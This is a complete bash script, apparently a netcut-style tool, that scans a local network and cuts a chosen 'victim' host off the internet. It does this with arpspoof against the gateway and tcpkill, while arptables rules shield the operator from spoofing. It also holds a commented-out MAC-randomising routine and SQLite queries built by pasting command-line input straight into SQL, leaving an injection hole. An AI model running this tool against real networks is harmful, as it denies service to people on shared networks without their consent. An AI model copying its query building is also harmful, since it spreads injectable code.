#!/usr/bin/env bash

# Full path of this script
THIS=$(readlink -f "${BASH_SOURCE[0]}" 2>/dev/null || echo "$0")

# This directory path
DIR=$(dirname "${THIS}")

# 'Dot' means 'source', i.e. 'include'
# shellcheck source=/dev/null
. "$DIR/base_script.sh"

# DESC: Usage help
# ARGS: None
# OUTS: None
function script_usage() {
	cat <<EOF
${script_name-} [-h] [-v] [-c Victim IP or Row ID] [-r Victim IP or Row ID] [-a] [-s] [-f] [-x] [--cron] [--no-colour]
Usage:
     -h             Displays this help
     -v             Displays verbose output
     -c             Cut of internet of victim IP or rowid
     -r             Resume internet of single host ip or rowid
     -a             Resume internet of all host
     -s             Scan network for available IPs
     -f             Flush everthing and start from scratch
     -x             Debug script
	 --cron         Run script via cron job
	 --no-colour    Disable colour coding of verbose messages.
EOF
}

# DESC: Parameter parser
# ARGS: $@ (optional): Arguments provided to the script
# OUTS: Variables indicating command-line parameters and options
function parse_params() {
	verbose=false
	resume_single=false
	resume_all=false
	victim=
	cut_off=false
	resume_all=false
	scanonly=false
	flush=false
	no_colour=true
	while getopts ":hxvasfc:r:-:" param; do
		case $param in
		h)
			script_usage
			exit 0
			;;
		v)
			# shellcheck disable=SC2034
			verbose=true
			;;
		c)
			cut_off=true
			victim=$OPTARG
			;;
		r)
			resume_single=true
			victim=$OPTARG
			;;
		a)
			resume_all=true
			;;
		s)
			scanonly=true
			;;
		f)
			flush=true
			;;
		x)
			set -o xtrace # Trace the execution of the script (debug)
			;;
		-)
			LONG_OPTARG="${OPTARG#*=}"
			case $LONG_OPTARG in
			no-colour)
				# shellcheck disable=SC2034
				no_colour=false
				;;
			cron)
				# shellcheck disable=SC2034
				cron=true
				;;
			esac
			;;
		*)
			script_exit "Invalid parameter was provided: $param" 2
			;;
		esac
	done
	shift $((OPTIND - 1))
}

function enable_protection() {
	local machine_data
	machine_data=$(get_gw_mac "${gw-}")
	local a
	# shellcheck disable=SC2001
	a=($(echo "$machine_data" | sed 's/|/\n/g'))

	# shellcheck disable=SC2154
	verbose_print "run_as_root arptables -A INPUT -s ${gw-} --source-mac ${a[2]} -j ACCEPT" "$fg_green"
	verbose_print "run_as_root arptables -A OUTPUT -s ${gw-} --destination-mac ${a[2]} -j ACCEPT" "$fg_green"

	run_as_root arptables -F
	run_as_root arptables -P INPUT DROP
	run_as_root arptables -P OUTPUT DROP
	run_as_root arptables -A INPUT -s "${gw-}" --source-mac "${a[2]}" -j ACCEPT
	run_as_root arptables -A OUTPUT -d "${gw-}" --destination-mac "${a[2]}" -j ACCEPT
}

function disable_protection() {
	run_as_root arptables -P INPUT ACCEPT
	run_as_root arptables -P OUTPUT ACCEPT
	run_as_root arptables -F
}

function netcutvictim() {
	local gw=$1
	local victim=$2
	local machine_data
	machine_data=$(select_machine true "$victim")
	local a
	# shellcheck disable=SC2001
	a=($(echo "$machine_data" | sed 's/|/\n/g'))

	verbose_print "run_as_root arpspoof -t $gw ${a[1]}" "$fg_green"
	verbose_print "run_as_root tcpkill -i ${iface-} -3 net ${a[1]}" "$fg_green"

	run_as_root sysctl -w net.ipv4.ip_forward=0 &>/dev/null
	run_as_root arpspoof -t "$gw" "${a[1]}" &>/dev/null &
	local arpspoof_pid=$!
	run_as_root tcpkill -i "${iface-}" -3 net "${a[1]}" &>/dev/null &
	local tcpkill_pid=$!
	update_pid_machine_list "$arpspoof_pid" "$tcpkill_pid" "$victim" 1
}

function netresume_single_host() {
	local victim="$1"
	local machine_data
	machine_data=$(select_machine true "$victim")
	local a
	# shellcheck disable=SC2001
	a=($(echo "$machine_data" | sed 's/|/\n/g'))

	verbose_print "run_as_root kill -9 $(pstree "${a[2]}" -p -a -l | cut -d, -f2 | cut -d' ' -f1)" "$fg_green"
	verbose_print "run_as_root kill -9 $(pstree "${a[3]}" -p -a -l | cut -d, -f2 | cut -d' ' -f1)" "$fg_green"

	run_as_root kill -9 "$(pstree "${a[2]}" -p -a -l | cut -d, -f2 | cut -d' ' -f1)" #arpspoof_pid
	run_as_root kill -9 "$(pstree "${a[3]}" -p -a -l | cut -d, -f2 | cut -d' ' -f1)" #tcpkill_pid
	update_pid_machine_list null null "$victim" 0
}

function netresumeall() {
	run_as_root sysctl -w net.ipv4.ip_forward=1
	run_as_root killall arpspoof
	run_as_root killall tcpkill
	update_all_machine_list 0
}

function change_mac() {
	local hexchars="0123456789ABCDEF"
	local end
	# shellcheck disable=SC2034,SC2004
	end=$(for i in {1..12}; do echo -n ${hexchars:$(($RANDOM % 16)):1}; done | sed -e 's/\(..\)/-\1/g')
	end=${end#*-}

	verbose_print "New MAC will be $end" "${fg_yellow-}"
	ifconfig "${iface-}" down hw ether "$end"
	ifconfig "${iface-}" up
}

function default_gw() {
	while
		read -r line
	do
		#'none default via 30.147.0.1 dev wifi0 proto unspec metric 0'
		if [[ $line == *"default"* ]]; then
			gw=$(echo "$line" | grep -E -o '([0-9]{1,3}\.){3}[0-9]{1,3}')
			iface=$(echo "$line" | grep -E -o '(eth|wifi)[0-9]')
			myip=$(hostname -I)
		fi
	done < <(ip route list)
	pretty_print "Gateway IP : $gw" "${fg_yellow-}"
	pretty_print "Interface : $iface" "${fg_yellow-}"
	pretty_print "Self IP : ${myip}" "${fg_yellow-}"
}

function arpscan() {
	while
		read -r line
	do
		if [[ $line =~ ^([0-9]{1,3}.?){4}.+$ ]]; then
			local a
			read -r -a a <<<"$line"
			insert_into_machine_list "${a[0]}" "${a[1]}"
			verbose_print "inserting machine ${a[0]} with mac ${a[1]}"
		fi
		#done < testscan.txt
	done < <(run_as_root arp-scan -l)
}

function insert_into_machine_list() {
	local qry="insert into machine_list(ip_address, mac_address, gw_address, iface, active) select '$1','$2','${gw-}','${iface-}',0 where not exists(select 1 from machine_list where ip_address = '${a[0]}');"
	verbose_print "$qry" "$fg_green"
	sqlite3 "${dbname-}" "$qry"
}

function update_pid_machine_list() {
	local qry="update machine_list set arpspoof_pid=$1, tcpkill_pid=$2, active=$4 where ip_address='$3' or rowid='$3';"
	verbose_print "$qry" "$fg_green"
	sqlite3 "${dbname-}" "$qry"
}

function update_all_machine_list() {
	local qry="update machine_list set arpspoof_pid=null, tcpkill_pid=null, active=$1"
	verbose_print "$qry" "$fg_green"
	sqlite3 "${dbname-}" "$qry"
}

function refresh() {
	qry="delete from machine_list;"
	verbose_print "$qry" "$fg_green"
	sqlite3 "${dbname-}" "$qry"
}

function select_machine() {
	local noheader=${1:-}
	local ip=${2:-}
	local where=";"
	if [ -n "$ip" ]; then
		where=" where ip_address = '$ip' or rowid =  '$ip';"
	fi
	local qry="select rowid, ltrim(ip_address||'          ',20) as ip_address, arpspoof_pid, tcpkill_pid, active from machine_list"$where
	verbose_print "$qry" "$fg_green"
	if $noheader; then
		sqlite3 "${dbname-}" "$qry"
	else
		sqlite3 -column -header "${dbname-}" "$qry"
	fi
}

function get_gw_mac() {
	local ip=${1:-}
	local where=";"
	if [ -n "$ip" ]; then
		where=" where ip_address = '$ip' or rowid =  '$ip';"
	fi
	local qry="select rowid, ip_address, mac_address from machine_list"$where
	verbose_print "$qry" "$fg_green"
	sqlite3 "${dbname-}" "$qry"
}

# DESC: Main control flow
# ARGS: $@ (optional): Arguments provided to the script
# OUTS: None
function main() {
	trap script_trap_err ERR
	trap script_trap_exit EXIT

	script_init "$@"
	parse_params "$@"
	cron_init
	colour_init
	lock_init system
	#change_mac
	default_gw
	if $flush; then
		netresumeall
		refresh
	elif $scanonly; then
		arpscan
	elif $cut_off; then
		enable_protection
		netcutvictim "${gw-}" "${victim-}"
	elif $resume_single; then
		netresume_single_host "${victim-}"
	elif $resume_all; then
		netresumeall
		disable_protection
	fi
	select_machine false
}

# Make it rain
main "$@"
